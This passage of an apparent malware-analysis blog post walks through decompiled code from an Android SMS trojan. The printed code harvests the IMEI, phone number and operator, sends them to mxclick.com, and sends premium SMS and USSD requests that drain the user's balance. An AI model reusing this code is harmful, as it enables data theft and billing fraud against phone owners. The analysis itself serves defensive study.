class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">StartupReceiver</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">BroadcastReceiver</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> ServiceConnection d = <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> a = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; Context b; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> ac = <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onReceive</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context paramContext, Intent paramIntent)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.b = paramContext; Object localObject = ((TelephonyManager)paramContext.getSystemService(<span class="hljs-string"><span class="hljs-string">"phone"</span></span>)).getSimOperatorName(); PreferenceManager.getDefaultSharedPreferences(paramContext).edit().putBoolean(<span class="hljs-string"><span class="hljs-string">"wasreload"</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>).commit(); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((((TelephonyManager)<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.b.getSystemService(<span class="hljs-string"><span class="hljs-string">"phone"</span></span>)).getSimOperator().toString().equals(<span class="hljs-string"><span class="hljs-string">"25099"</span></span>)) || (((String)localObject).toLowerCase().contains(<span class="hljs-string"><span class="hljs-string">"tele"</span></span>)) || (((String)localObject).toLowerCase().contains(<span class="hljs-string"><span class="hljs-string">"    "</span></span>))) d = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> j(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (Exception localException1) { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { paramContext.bindService(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(<span class="hljs-string"><span class="hljs-string">"com.android.ussd.IExtendedNetworkService"</span></span>), d, <span class="hljs-number"><span class="hljs-number">1</span></span>); label120: localObject = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.c; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (localObject != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.ca(<span class="hljs-string"><span class="hljs-string">":ON;)"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { label141: paramContext.startService(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(paramContext, UpdateService.class)); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; localException1; } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (RemoteException localRemoteException) { <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> label141; } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (Exception localException2) { <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> label120; } } } }</code> </pre></div></div><br><br>  Apparently, if necessary, there is a binding with a system service that provides USSD requests.  It would be logical to assume that the trojan tracks the user's balance in this way. <br>  In addition, the code shows that the <b>UpdateService</b> service is <b>running</b> . <br><br><div class="spoiler">  <b class="spoiler_title">UpdateService code</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">package</span></span> net.droid.installer; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.app.AlarmManager; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.app.PendingIntent; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.app.Service; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.Context; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.Intent; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.SharedPreferences; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.SharedPreferences.Editor; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.os.IBinder; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.preference.PreferenceManager; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UpdateService</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Service</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> Context a; <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> String b = <span class="hljs-string"><span class="hljs-string">"http://mxclick.com/"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> c = <span class="hljs-number"><span class="hljs-number">60</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> SharedPreferences d; <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> String e = b; <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> f = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ SharedPreferences.Editor localEditor = d.edit(); localEditor.putBoolean(<span class="hljs-string"><span class="hljs-string">"appblocked"</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); localEditor.commit(); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String paramString)</span></span></span><span class="hljs-function"> </span></span>{ SharedPreferences.Editor localEditor = d.edit(); localEditor.putString(a.getString(<span class="hljs-number"><span class="hljs-number">2130968584</span></span>), paramString); localEditor.commit(); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> IBinder </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onBind</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Intent paramIntent)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onCreate</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onDestroy</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">super</span></span>.onDestroy(); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onStart</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Intent paramIntent, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> paramInt)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">super</span></span>.onStart(paramIntent, paramInt); a = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; Object localObject = PreferenceManager.getDefaultSharedPreferences(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); d = (SharedPreferences)localObject; e = ((SharedPreferences)localObject).getString(getString(<span class="hljs-number"><span class="hljs-number">2130968584</span></span>), b); localObject = (AlarmManager)getSystemService(<span class="hljs-string"><span class="hljs-string">"alarm"</span></span>); PendingIntent localPendingIntent = PendingIntent.getBroadcast(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>, UpdateReceiver.class), <span class="hljs-number"><span class="hljs-number">0</span></span>); ((AlarmManager)localObject).setRepeating(<span class="hljs-number"><span class="hljs-number">0</span></span>, System.currentTimeMillis(), <span class="hljs-number"><span class="hljs-number">60000</span></span> * c, localPendingIntent); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">boolean</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onUnbind</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Intent paramIntent)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">super</span></span>.onUnbind(paramIntent); } }</code> </pre><br></div></div><br><br>  Obviously, when starting this service, using the AlarmManager scheduler, it starts Intent, which is a signal to launch a BroadcastReceiver with the name <b>UpdateReceiver</b> , or rather, its method is onReceive. <br><br><div class="spoiler">  <b class="spoiler_title">UpdateReceiver Code</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">package</span></span> net.droid.installer; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> a; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.app.PendingIntent; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.BroadcastReceiver; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.Context; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.Intent; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.ServiceConnection; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.SharedPreferences; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.SharedPreferences.Editor; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.net.Uri; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.os.PowerManager; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.os.PowerManager.WakeLock; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.preference.PreferenceManager; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.telephony.SmsManager; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.telephony.TelephonyManager; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> java.util.ArrayList; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UpdateReceiver</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">BroadcastReceiver</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> i = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> ServiceConnection l = <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; Context a; SharedPreferences b; <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> c = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; String d = <span class="hljs-string"><span class="hljs-string">""</span></span>; String e = <span class="hljs-string"><span class="hljs-string">""</span></span>; String f = <span class="hljs-string"><span class="hljs-string">""</span></span>; String g = <span class="hljs-string"><span class="hljs-string">""</span></span>; String h = <span class="hljs-string"><span class="hljs-string">""</span></span>; ArrayList j = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayList(); <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> ak = <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> String </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> ((TelephonyManager)<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a.getSystemService(<span class="hljs-string"><span class="hljs-string">"phone"</span></span>)).getSimOperator().toString(); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String paramString1, String paramString2)</span></span></span><span class="hljs-function"> </span></span>{ PendingIntent localPendingIntent1 = PendingIntent.getBroadcast(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(<span class="hljs-string"><span class="hljs-string">"SMS_SENT"</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>); PendingIntent localPendingIntent2 = PendingIntent.getBroadcast(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(<span class="hljs-string"><span class="hljs-string">"SMS_DELIVERED"</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>); SmsManager.getDefault().sendTextMessage(paramString1, <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>, paramString2, localPendingIntent1, localPendingIntent2); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onReceive</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context paramContext, Intent paramIntent)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a = paramContext; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.b = PreferenceManager.getDefaultSharedPreferences(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a); PowerManager.WakeLock localWakeLock = ((PowerManager)paramContext.getSystemService(<span class="hljs-string"><span class="hljs-string">"power"</span></span>)).newWakeLock(<span class="hljs-number"><span class="hljs-number">26</span></span>, <span class="hljs-string"><span class="hljs-string">"ALARMSERVICE"</span></span>); localWakeLock.acquire(); Object localObject = ((TelephonyManager)<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a.getSystemService(<span class="hljs-string"><span class="hljs-string">"phone"</span></span>)).getSimOperatorName(); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (a().equals(<span class="hljs-string"><span class="hljs-string">"25001"</span></span>)) a(<span class="hljs-string"><span class="hljs-string">"111"</span></span>, <span class="hljs-string"><span class="hljs-string">"11"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!PreferenceManager.getDefaultSharedPreferences(paramContext).getBoolean(<span class="hljs-string"><span class="hljs-string">"appblocked"</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>)) { localObject = PreferenceManager.getDefaultSharedPreferences(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a); SharedPreferences.Editor localEditor = ((SharedPreferences)localObject).edit(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (((SharedPreferences)localObject).getBoolean(<span class="hljs-string"><span class="hljs-string">"new"</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>)) { localEditor.putBoolean(<span class="hljs-string"><span class="hljs-string">"new"</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>); localEditor.putLong(<span class="hljs-string"><span class="hljs-string">"time"</span></span>, <span class="hljs-number"><span class="hljs-number">1200000L</span></span> + System.currentTimeMillis()); localEditor.commit(); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (System.currentTimeMillis() &gt; ((SharedPreferences)localObject).getLong(<span class="hljs-string"><span class="hljs-string">"time"</span></span>, <span class="hljs-number"><span class="hljs-number">0L</span></span>)) <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> m(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>).execute(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> String[<span class="hljs-number"><span class="hljs-number">0</span></span>]); } label191: localWakeLock.release(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (a().equals(<span class="hljs-string"><span class="hljs-string">"25002"</span></span>)) { a(<span class="hljs-string"><span class="hljs-string">"000100"</span></span>, <span class="hljs-string"><span class="hljs-string">"b"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((a().equals(<span class="hljs-string"><span class="hljs-string">"25099"</span></span>)) &amp;&amp; (PreferenceManager.getDefaultSharedPreferences(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a).getBoolean(<span class="hljs-string"><span class="hljs-string">"wasreload"</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>))) { localObject = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(<span class="hljs-string"><span class="hljs-string">"android.intent.action.CALL"</span></span>, Uri.parse(<span class="hljs-string"><span class="hljs-string">"tel:*102"</span></span> + Uri.encode(<span class="hljs-string"><span class="hljs-string">"#"</span></span>))); ((Intent)localObject).addFlags(<span class="hljs-number"><span class="hljs-number">268435456</span></span>); paramContext.startActivity((Intent)localObject); <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (((!((String)localObject).toLowerCase().contains(<span class="hljs-string"><span class="hljs-string">"tele"</span></span>)) &amp;&amp; (!((String)localObject).toLowerCase().contains(<span class="hljs-string"><span class="hljs-string">"    "</span></span>))) || (!PreferenceManager.getDefaultSharedPreferences(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.a).getBoolean(<span class="hljs-string"><span class="hljs-string">"wasreload"</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>))) <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; localObject = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(<span class="hljs-string"><span class="hljs-string">"android.intent.action.CALL"</span></span>, Uri.parse(<span class="hljs-string"><span class="hljs-string">"tel:*105"</span></span> + Uri.encode(<span class="hljs-string"><span class="hljs-string">"#"</span></span>))); ((Intent)localObject).addFlags(<span class="hljs-number"><span class="hljs-number">268435456</span></span>); paramContext.startActivity((Intent)localObject); } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (Exception localException) { <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> label191; } } }</code> </pre><br></div></div><br><br>  Here we see that the trojan checks the user's current balance before sending an SMS.  And besides that, it launches AsyncTask with the name <b>m</b> , which sends a request to the <a href="http://mxclick.com/getTask.php" rel="nofollow"><b>mxclick.com/getTask.php</b></a> script.  The script apparently gives the desired number, which will be sent to those or other SMS.  Well, in the end, UpdateReceiver sends an SMS, thereby draining the balance of the poor user. <br><br><div class="spoiler">  <b class="spoiler_title">AsyncTask successor code - class m</b> <div class="spoiler_text"><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">package</span></span> net.droid.installer; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.app.Notification; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.app.NotificationManager; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.app.PendingIntent; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.ContentResolver; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.Context; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.Intent; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.content.SharedPreferences; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.database.Cursor; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.net.Uri; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.os.AsyncTask; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.os.Build; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.os.Build.VERSION; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.preference.PreferenceManager; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.provider.ContactsContract.CommonDataKinds.Phone; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.provider.ContactsContract.Contacts; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> android.telephony.TelephonyManager; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> java.io.BufferedReader; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> java.io.InputStream; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> java.io.InputStreamReader; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> java.net.URI; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> java.net.URL; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> java.util.ArrayList; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> org.apache.http.HttpEntity; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> org.apache.http.HttpResponse; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> org.apache.http.client.HttpClient; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> org.apache.http.client.methods.HttpGet; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> org.apache.http.impl.client.DefaultHttpClient; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> org.json.JSONArray; <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> org.json.JSONObject; <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">m</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">AsyncTask</span></span></span><span class="hljs-class"> </span></span>{ m(UpdateReceiver paramUpdateReceiver) { } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> String </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ String str1; <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { Object localObject7 = (TelephonyManager)<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.aagetSystemService(<span class="hljs-string"><span class="hljs-string">"phone"</span></span>); Object localObject2 = ((TelephonyManager)localObject7).getDeviceId(); Object localObject4 = ((TelephonyManager)localObject7).getSimCountryIso(); Object localObject1 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> DefaultHttpClient(); Object localObject5 = ((TelephonyManager)localObject7).getLine1Number(); Object localObject3 = ((TelephonyManager)localObject7).getNetworkOperatorName(); String str3 = ((TelephonyManager)localObject7).getNetworkOperator(); String str2 = Integer.toString(Build.VERSION.SDK_INT); localObject7 = Build.MODEL; localObject2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> URL(UpdateService.e + <span class="hljs-string"><span class="hljs-string">"getTask.php?imei="</span></span> + (String)localObject2 + <span class="hljs-string"><span class="hljs-string">"&amp;balance="</span></span> + PreferenceManager.getDefaultSharedPreferences(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.aa).getString(<span class="hljs-string"><span class="hljs-string">"balance"</span></span>, <span class="hljs-string"><span class="hljs-string">"0"</span></span>) + <span class="hljs-string"><span class="hljs-string">"&amp;country="</span></span> + (String)localObject4 + <span class="hljs-string"><span class="hljs-string">"&amp;phone="</span></span> + (String)localObject5 + <span class="hljs-string"><span class="hljs-string">"&amp;op="</span></span> + (String)localObject3 + <span class="hljs-string"><span class="hljs-string">"&amp;mnc="</span></span> + str3.substring(<span class="hljs-number"><span class="hljs-number">3</span></span>) + <span class="hljs-string"><span class="hljs-string">"&amp;mcc="</span></span> + str3.substring(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">3</span></span>) + <span class="hljs-string"><span class="hljs-string">"&amp;model="</span></span> + (String)localObject7 + <span class="hljs-string"><span class="hljs-string">"&amp;os="</span></span> + str2); localObject2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> URI(((URL)localObject2).getProtocol(), ((URL)localObject2).getUserInfo(), ((URL)localObject2).getHost(), ((URL)localObject2).getPort(), ((URL)localObject2).getPath(), ((URL)localObject2).getQuery(), ((URL)localObject2).getRef()).toURL(); ((URL)localObject2).toString(); localObject1 = ((HttpClient)localObject1).execute(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> HttpGet(((URL)localObject2).toString())).getEntity().getContent(); localObject4 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BufferedReader(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> InputStreamReader((InputStream)localObject1, <span class="hljs-string"><span class="hljs-string">"utf-8"</span></span>), <span class="hljs-number"><span class="hljs-number">8</span></span>); localObject2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { localObject3 = ((BufferedReader)localObject4).readLine(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (localObject3 == <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; ((StringBuilder)localObject2).append((String)localObject3); } ((StringBuilder)localObject2).toString(); ((InputStream)localObject1).close(); ((BufferedReader)localObject4).close(); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { localObject2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> JSONArray(((StringBuilder)localObject2).toString()); <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (i &gt;= ((JSONArray)localObject2).length()) <span 